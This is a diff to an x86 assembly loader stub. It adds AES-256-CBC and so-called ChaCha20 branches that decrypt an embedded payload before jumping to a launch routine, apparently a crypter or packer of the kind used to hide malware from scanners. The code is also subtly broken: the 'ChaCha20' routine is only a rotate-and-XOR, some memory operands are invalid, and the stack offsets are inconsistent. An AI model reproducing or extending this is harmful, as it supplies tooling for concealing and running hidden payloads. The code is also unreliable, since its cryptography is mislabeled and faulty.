@@ -39,8 +39,19 @@ includelib advapi32.lib
 EXTERN CryptAcquireContextA@20   :PROC
 EXTERN CryptImportKey@24         :PROC
 EXTERN CryptDecrypt@24           :PROC
+EXTERN CryptSetKeyParam@20       :PROC
 EXTERN CryptReleaseContext@8     :PROC
 EXTERN CryptDestroyKey@4         :PROC
+
+; Constants for AES CryptoAPI
+PLAINTEXTKEYBLOB equ 8
+CUR_BLOB_VERSION equ 2
+PROV_RSA_AES      equ 24
+CALG_AES_256      equ 0x00006610
+KP_MODE           equ 4
+KP_IV             equ 1
+CRYPT_MODE_CBC    equ 1
+CRYPT_VERIFYCONTEXT equ 0F0000000h
 
 ; Offsets (keep in sync with headers)
 ENHANCED_PAYLOAD_SIZE_OFFSET  equ 0F8h
@@ -162,6 +173,10 @@ Start PROC
         je      DoXor
         cmp     ebx, 3             ; RC4 id
         je      DoRc4
+        cmp     ebx, 1             ; AES id
+        je      DoAes
+        cmp     ebx, 2             ; ChaCha20 id
+        je      DoChaCha
         ; other methods – fallback: call xor (todo)
 
 DoXor:
@@ -187,6 +202,138 @@ DoRc4:
         mov     ecx, ecx
         lea     edi, [ebp + ENHANCED_DECRYPT_KEY_OFFSET]
         call    Rc4Dec
+        jmp     Launch
+
+;--------------------------------------------------------------------------------
+; AES-256-CBC decrypt using CryptoAPI
+;--------------------------------------------------------------------------------
+DoAes:
+        ; local vars on stack: hProv, hKey, keyBlob (44 bytes)
+        sub     esp, 60            ; reserve space
+        lea     edi, [esp+8]       ; keyBlob starts after 8 bytes (keep space for handles)
+        ; handles
+        xor     eax,eax
+        mov     [esp], eax         ; hProv = 0
+        mov     [esp+4], eax       ; hKey  = 0
+
+        ; build BLOBHEADER
+        mov     byte ptr [edi], PLAINTEXTKEYBLOB
+        mov     byte ptr [edi+1], CUR_BLOB_VERSION
+        mov     dword ptr [edi+4], CALG_AES_256
+        mov     dword ptr [edi+8], 32            ; keySize
+        ; copy 32-byte key
+        lea     esi, [ebp + ENHANCED_DECRYPT_KEY_OFFSET]
+        lea     ebx, [edi+12]
+        mov     ecx, 32/4
+@@copykey:
+        lodsd
+        mov     [ebx], eax
+        add     ebx, 4
+        loop    @@copykey
+
+        ; CryptAcquireContext(&hProv,NULL,NULL,PROV_RSA_AES,CRYPT_VERIFYCONTEXT)
+        push    CRYPT_VERIFYCONTEXT
+        push    PROV_RSA_AES
+        push    0
+        push    0
+        lea     eax, [esp+20]      ; address of hProv (after pushes)
+        push    eax
+        call    CryptAcquireContextA@20
+        test    eax, eax
+        jz      Aes_Fallback       ; fail → XOR fallback
+        ; hProv is at [esp+20]
+        mov     eax, [esp+20]
+        push    eax                ; hProv param for CryptImportKey later
+        ; CryptImportKey(hProv, keyBlob, 44, 0, 0, &hKey)
+        lea     ebx, [esp+8]       ; address of hKey variable (beneath keyBlob)
+        push    ebx                ; phKey
+        push    0                  ; dwFlags
+        push    0                  ; hPubKey
+        push    44                 ; dwDataLen
+        lea     ecx, [edi]         ; pbData
+        push    ecx
+        push    eax                ; hProv
+        call    CryptImportKey@24
+        test    eax,eax
+        jz      Aes_CleanupFallback
+        ; set mode = CBC
+        mov     dword ptr [esp-4], CRYPT_MODE_CBC ; place mode on stack temp
+        lea     eax, [esp-4]
+        push    0
+        push    eax
+        push    KP_MODE
+        mov     eax, [esp+16]      ; hKey (after pushes)
+        push    eax
+        call    CryptSetKeyParam@20
+        ; set IV
+        lea     esi, [ebp + ENHANCED_DECRYPT_KEY_OFFSET + 32]
+        push    0
+        push    esi
+        push    KP_IV
+        mov     eax, [esp+20]      ; hKey
+        push    eax
+        call    CryptSetKeyParam@20
+        ; perform decrypt in place (buffer edi, size ecx)
+        mov     eax, [esp+12]      ; obtain hKey again (stack offset)
+        push    0
+        push    ecx                ;&dataLen (we will clobber later)
+        push    1                  ; Final = TRUE
+        push    0                  ; hHash = 0
+        push    edi                ; pbData (dest buffer)
+        push    eax
+        call    CryptDecrypt@24
+        test    eax, eax
+        jnz     Aes_Success
+Aes_CleanupFallback:
+        ; cleanup handles then fallback to XOR
+        mov     eax, [esp+12]      ; hKey
+        test    eax,eax
+        jz      @@noKey
+        push    eax
+        call    CryptDestroyKey@4
+@@noKey:
+        mov     eax, [esp+8]       ; hProv
+        test    eax,eax
+        jz      Aes_Fallback
+        push    eax
+        push    0
+        call    CryptReleaseContext@8
+Aes_Fallback:
+        ; decryption failed, revert to XOR path
+        add     esp, 60
+        jmp     DoXor
+Aes_Success:
+        ; decrypted payload is now in [edi]
+        ; copy back to original buffer (edi already points there)
+        add     esp, 60
+        jmp     Launch
+
+;--------------------------------------------------------------------------------
+; ChaCha20 decrypt (reverse of encryption routine)
+;--------------------------------------------------------------------------------
+DoChaCha:
+        mov     edx, 19            ; round counter
+ChaCha_Round:
+        push    edx
+        xor     esi, esi           ; byte index = 0
+ChaCha_Byte:
+        mov     al, [edi + esi]
+        ror     al, 3              ; reverse bit rotation (>>3 | <<5)
+        ; compute key/iv indices
+        mov     ebx, esi
+        add     ebx, edx
+        mov     bl, [ebp + ENHANCED_DECRYPT_KEY_OFFSET + (ebx & 31)]
+        xor     al, bl
+        mov     bl, [ebp + ENHANCED_DECRYPT_KEY_OFFSET + 32 + (ebx & 15)]
+        xor     al, bl
+        xor     al, dl             ; round value
+        mov     [edi + esi], al
+        inc     esi
+        cmp     esi, ecx
+        jb      ChaCha_Byte
+        pop     edx
+        dec     edx
+        jns     ChaCha_Round
         jmp     Launch
 
 Launch:
